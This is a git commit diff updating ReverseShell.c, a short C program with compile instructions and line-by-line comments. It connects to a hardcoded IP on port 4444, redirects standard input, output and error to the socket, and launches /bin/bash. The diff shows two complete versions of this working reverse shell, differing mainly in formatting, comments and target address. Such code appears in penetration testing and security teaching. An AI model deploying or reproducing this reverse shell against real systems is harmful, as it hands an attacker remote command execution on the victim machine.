9e19f24b74e4a66dacc2ce86a6b3ec642dab5243
blackantrax <37629170+blackantrax@users.noreply.github.com>
2019-01-10 15:07:05 -0500

    Update ReverseShell.c

--- ReverseShell.c
+++ ReverseShell.c
@@ -1,36 +1,43 @@
-#include <stdio.h>
-#include <sys/socket.h>
-#include <sys/types.h>
+// Default port used: 4444
+//Simple ReverseShell
+// Compilation Instructions: gcc reverseShell.c -o reverseShell
+#include <stdio.h> // Input and output
 #include <stdlib.h>
-#include <unistd.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
+#include <sys/socket.h> // Sockets
+#include <sys/types.h> // Definitions and data types for sysCalls
+#include <unistd.h> 
+#include <netinet/in.h> // Constants and Structures for INET Domain Adresses
+#include <arpa/inet.h>  // IP's
 
-int main(void){
 
-        int sockt;
-        int port = 4444;
-        struct sockaddr_in revsockaddr;
+int main(void)
+{
+	int sock_used; // socket
+	int port = 4444; // Port the RS is gonna use to listen
+	struct sockaddr_in reverseSockAdd;
 
-        sockt = socket(AF_INET, SOCK_STREAM,0);
-        revsockaddr.sin_family = AF_INET;       
-        revsockaddr.sin_port = htons(port);
-        revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.106");
+	sock_used = socket(AF_INET, SOCK_STREAM,0); //Creation of the Socket EndPoint for connection
+											 // AF_INET to specify and IPv4 connection
+						                       //Sock_STREAM used to speciy a two way connection
+						                      // 0 for the protocol (TCP or UDP)
+	reverseSockAdd.sin_family = AF_INET; /*Used to specify what protocol you are using*/
+	reverseSockAdd.sin_port = htons(port);/*Specify the port we gonna use*/
+											//The portNumber has to be converted to a NetworkByte
+	reverseSockAdd.sin_addr.s_addr = inet_addr("10.150.130.9"); // Specify the targeted IP adress
+	
+	connect(sock_used, (struct sockaddr *) &reverseSockAdd,
+	sizeof(reverseSockAdd)); // Used in conjonction with the socket to connect
+			                // Connect to the Socket using the Structure
+	/*We now going use the dup2 function to create a copy of the file descriptor*/
+	/*We are going to use it for the input and output */
 
-        connect(sockt, (struct sockaddr *) &revsockaddr, 
-        sizeof(revsockaddr));
-        dup2(sockt, 0);
-        dup2(sockt, 1);
-        dup2(sockt, 2);
+	dup2(sock_used,0); /*You have the old file descriptor and then the new one*/
+	dup2(sock_used, 1);
+	dup2(sock_used, 2);
 
-        char * const argv[] = {"/bin/bash", NULL};
-        execve("/bin/bash", argv, NULL);
+	// creation of a constant 
+	char * const argv[] = {"/bin/bash", NULL};
+	execve("/bin/bash", argv,NULL); //SysCall
 
-        return 0;
-
+	return 0;
 }
-
-
-
-
-
